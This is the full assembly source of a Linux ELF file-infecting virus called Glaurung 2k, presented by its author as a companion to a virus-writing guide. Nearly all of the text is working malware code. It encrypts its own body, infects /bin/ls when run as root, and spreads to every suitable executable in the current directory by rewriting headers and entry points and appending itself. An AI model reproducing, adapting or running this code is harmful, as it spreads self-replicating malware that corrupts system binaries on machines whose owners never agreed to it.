;
;          linux.Glaurung 2k.666
;
;
;  This is a linux version of my other glaurung (dos) virus.
;  For thoses who didn't read the glaurung-dos description, 
;  Glaurung if the father of all dragons, and comes from the 
;  wonderfull book of JRR Tolkien ; Silmarillion .
;  
;  I love linux and I love to code vx stuff...
;  So.. things had to happen. 
;
;  This is an example for my linux virus writing guide.
;  You'll find all technical information in it.
;
;  It should be rather safe. It needs further testing. Any volonteer ?
;
;  Handshakes flying to 29A dudez, FS membrz, french vx ppl, iKX, lz0,
;   and the nice coderz from APJ.
;
;
;
;                                        -=%( mandragore/FS )%=-
;
;

global main

section .rdata		;  the return point for 1st gen.
bye:
	mov eax,1
	mov ebx,0
	int 80h

section .data
main:

;--------------------- virus entry point

bov:
	db 0beh
.adrboc dd .boc
	mov edi,esi
	mov ecx,virsiz/2
.decrypt:
	lodsw
        db 66h,35h                      ;  xor ax,
.xorval dw 0
	stosw
	loop .decrypt

.boc:

        db 0bah                         ;  mov edx,end of .bss section in memory
.eobss dd eov
        add edx,byte .movsb-bov+6       ;  that's for safety
        db 0beh                         ;  mov esi,addr of the end of virus code in memory
.Veov dd eov
	mov ecx,virsiz

	push byte 2dh
        pop eax                 ;  brk function
        mov ebx,edx             ;    we have to move the end of our segment 
        add ebx,ecx             ;    in order to make usable room for us.
	mov edi,ebx				
        cmp ebx,esi             ;  needed ? if not it may crash, so check.
        ja .k_brk               ;   crash if we set the limit before the end
        mov ebx,esi             ;   of the code section
.k_brk:
	add ebx,34h+6*20h+600h	;   add data space 
	int 80h

        cmp esi,edi             ;  edi=addr where we should relocate ourself
        jae .relocated          ;  do we need to do it ?
        std                     ;  movsb backward (and not overwrite ourself)
        inc ecx                 ;                - once again :)
	rep movsb
.movsb:	
	cld

	add edx,byte $-bov+5
        jmp edx                 ;  jmp to relocated code

.relocated:
	call .delta
.delta:
	pop ebp
        sub ebp,.delta          ;  kill all AV company on earth

        lea esi,[ebp+eov]       ;  set it now, it's used everywhere below

        db 0b8h                 ;  mov eax,real entry point in mem
.rentryp dd bye
        push eax                ;  ret to host is below..

	db 0bfh	                ;  mov edi,
.offoz dd 0                     ;  start addr in .bss to overwrite from
	db 0b9h                 ;  mov ecx,
.nboz dd 0                      ;  size of filed to annihilate
	xor eax,eax
        repz stosb              ;  clean

	lea ebx,[ebp+ls]
        call infect             ;  in case we're ran as root

	xor eax,eax
	mov ecx,eax
	add al,5
	lea ebx,[ebp+dir]
        int 80h                 ;  open current directory
	mov ebx,eax
	cdq
	inc edx
	jz .bye
.bcl_inf:
	push byte 59h
	pop eax
	mov ecx,esi
        int 80h                 ;  and get files
	or eax,eax
	jz .bye
	push ebx
	push esi
	mov ebx,esi
	add ebx,byte 10
        call infect             ;  try to slurp them
	pop esi
	pop ebx
	jmp short .bcl_inf

.bye:
	xor edx,edx
	ret	

;---------------  infection rutine

infect:
	push byte 5
	pop eax
	cdq
	mov ecx,edx
	mov cl,2
        int 80h                 ;  open r/w
	mov ebx,eax
	cdq
	inc edx
	jz .noinf_
	push byte 3
	pop eax
	cdq
	mov ecx,esi
	mov dl,34h+6*20h
        int 80h                 ;  read e_header + p_header

	cmp dword [esi],464c457fh	;  check for ELF exec
	jne .noinf_
	cmp byte [esi+7],'!'		;  check for infection mark
	je .noinf_
	cmp byte [esi+12h],3		;  check if x86 based
	jne .noinf_
	cmp word [esi+01ch],byte 34h;  
        jne .noinf_                     ;
        cmp dword [esi+2ah],060020h     ;  check for regular e_header 
        jne .noinf_                     ;
	cmp word [esi+2eh],byte 28h	;
	je $+7
.noinf_:
	jmp near .noinf

	push byte 13h
	pop eax
	push eax
	cdq
	mov ecx,edx
	mov dl,2
        int 80h                         ;  get filesize (lseek at eof)

	push eax
	add eax,eov-bov
	mov edi,esi
	add edi,34h+3*20h+10h
	mov edx,[edi-12]
	sub eax,edx
        stosd                           ;  patch 2nd PT_LOAD p_entry
	cmp eax,[edi]
	ja $+4
	xchg eax,[edi]
	stosd
	mov eax,[edi-16]
	sub eax,edx
	pop edx
	add eax,edx
	push eax
	add eax,bov.boc-bov
	mov [ebp+bov.adrboc],eax
	add eax,virsiz-(bov.boc-bov)
	mov [ebp+bov.Veov],eax
	pop eax
        xchg [esi+18h],eax              ;  compute entry point
        mov [ebp+bov.rentryp],eax       ;  and store the old one
	mov byte [esi+7],'!'		;  mark as infected

        pop eax                 ;  13h
	push eax
	cdq
	xor ecx,ecx
	int 80h			;  lseek to bof
	add al,4
	mov ecx,esi
	mov dl,34h+6*20h
	int 80h			;  write e_header + p_header

	pop eax			;  13h
	mov ecx,[esi+20h]
	cdq
	int 80h			;  lseek to section headers
	push byte 3
	pop eax
	mov ecx,esi
	movzx edx,word [esi+30h]
	push edx
	imul edx,edx,byte 28h
	int 80h			;  read them
	mov ecx,[esp]
	mov edi,esi

; here we'll try to find the .bss section

.bclbss:
	cmp word [edi+4],8
	je .gotbss
	dec ecx
	jz .nobss
	add edi,byte 28h
	jmp short .bclbss
.nobss:
	mov eax,[ebp+bov.Veov]
	jmp short .writeob
.gotbss:
	mov eax,[edi+0ch]
	mov [ebp+bov.offoz],eax
	add eax,[edi+14h]
.writeob:
	mov [ebp+bov.eobss],eax
	
; now we need to find the highest relocation offset

	pop ecx
	mov edi,esi
.bclrel:
	cmp dword [edi+4],byte 9
	je .gotrel
	dec ecx
	jz .norel
	add edi,byte 28h
	jmp short .bclrel
.norel:
	mov edx,[ebp+bov.offoz]
	jmp short .setoz
.gotrel:
	push ecx
	push byte 13h
	pop eax
	cdq
	mov ecx,[edi+10h]
	int 80h
	pop ecx
	mov edx,[edi+14h]
	dec ecx
	jz .readrel
	add edi,byte 28h
.getrelsz:
	cmp dword [edi+4],byte 9
	jne .readrel
	add edx,[edi+14h]
	add edi,byte 28h
	dec ecx
	jnz .getrelsz
.readrel:
	push byte 3
	pop eax
	mov ecx,esi
	int 80h		;  read
	xchg ecx,edx
	shr ecx,2
	cdq
.bclgotmaxrel:	
	lodsd
	cmp eax,edx
	jb .nextrel
	mov edx,eax
.nextrel:
	loop .bclgotmaxrel
	add edx,byte 4
.setoz:
	lea edi,[ebp+bov.offoz]
	mov eax,[edi]
        cmp edx,eax                     ;  check if last reloc is below .bss
	jb $+6
	mov [edi],edx
	mov eax,edx
	mov edx,[ebp+bov.eobss]		;  eax = beg of zone to overwrite
        sub edx,eax                     ;  edx = eof .bss
	jnc .dontxor
.xorit:
	cdq
.dontxor:
	mov [ebp+bov.nboz],edx

; now proceed to ADN injetion

.inject:
	push byte 13h
	pop eax
	cdq
	push ebx
	mov dl,2
	int 80h			;  lseek at eof

	xor eax,eax
	mov ebx,eax
	add al,13
	int 80h			;  get xor val from time
	mov [ebp+.xorval],ax
	mov [ebp+bov.xorval],ax
	
	push esi
	push esi
	pop edx
	pop edi
	lea esi,[ebp+bov]
	mov ecx,virsiz/4
	rep movsd		;  copy vir after us in ram

	mov esi,edx
	add esi,byte bov.boc-bov
	mov edi,esi
	mov ecx,virsiz/2
.crypt:
	lodsw
	db 66h,35h		;  xor it
.xorval dw 0
	stosw
	loop .crypt

	mov ax,virsiz
	xchg ecx,edx
	pop ebx
	cwde
	xchg eax,edx
	add al,4
	int 80h			;  and write it

.noinf:
	push byte 6
	pop eax
	int 80h			;  close
.bye:
	ret

ls	db '/bin/ls',0
dir db '.',0
	db 13,10
sig db '[Glaurung 2k] by mandragore/FS'
eov:
virsiz equ eov-bov
